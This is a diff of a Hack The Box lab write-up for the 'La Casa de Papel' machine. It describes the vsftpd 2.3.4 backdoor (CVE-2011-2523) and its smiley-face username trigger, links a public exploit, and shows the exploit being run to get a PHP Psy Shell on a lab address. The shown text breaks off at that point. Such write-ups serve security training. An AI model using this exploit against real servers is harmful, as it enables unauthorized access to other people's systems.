@@ -13,7 +13,7 @@ categories: [ctf]
 - **OS:** Linux
 - **Difficulty:** Easy
 
-La Casa de Papel is an easy machine featuring the importance of keeping software up to date. It is a longer machine than usual, specifically because it requires more steps. It also provides some interesting concepts in certifications and SSL connections.
+La Casa de Papel is an easy machine that highlights the importance of keeping software up to date. While the difficulty is low, the machine is longer than usual, as it requires several distinct steps to fully compromise. It also introduces interesting concepts related to SSL certificates and secure connections.
 
 ---
 
@@ -48,5 +48,29 @@ PORT    STATE SERVICE  VERSION
 
 Service Info: OS: Unix
 ```
-Nmap reveals four open ports. Port 21 is running a vsftpd FTP service. Anonymous login is not permitted; however, the service is using an outdated and well-known version of vsftpd, which has historically been associated with serious vulnerabilities and therefore deserves further attention.
-A quick research will show us [CVE-2011-2523](https://www.cvedetails.com/cve/CVE-2011-2523/), which, interestingly, is a backdoor created for this sole purpose. A little bit further into research reveals that users logging into a compromised vsftpd-2.3.4 server may issue a :) smileyface as the username and gain a command shell on port 6200.
+Nmap reveals four open ports. 
+
+Port 21 is running a vsftpd FTP service. Anonymous login is not permitted; however, the service is using an outdated and well-known version of vsftpd, which has historically been associated with serious vulnerabilities.
+
+
+
+A quick research will show us [CVE-2011-2523](https://www.cvedetails.com/cve/CVE-2011-2523/). The CVE explains that the executable downloadable from the source contains a malicious beackdoor and a little bit further into research reveals that users logging into a compromised vsftpd-2.3.4 server may issue a :) smileyface as the username and gain a command shell on port 6200.
+
+Due to the age of this CVE, reliable proof-of-concept exploits are easy to find and well documented. I'm going to be using this [one](https://github.com/Hellsender01/vsftpd_2.3.4_Exploit)
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/vsftpd_2.3.4_Exploit]
+└─$ python exploit.py 10.129.8.191
+[+] Got Shell!!!
+[+] Opening connection to 10.129.8.191 on port 21: Done
+[*] Closed connection to 10.129.8.191 port 21
+[+] Opening connection to 10.129.8.191 on port 6200: Done
+[*] Switching to interactive mode
+
+Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
+$
+```
+The exploit works, however, we don't get a bash shell. Instead, we have a Psy Shell, which is the interpreter for PHP code, similar to python's interactive shell. This means we have to execute commands using php language.
+
+
+
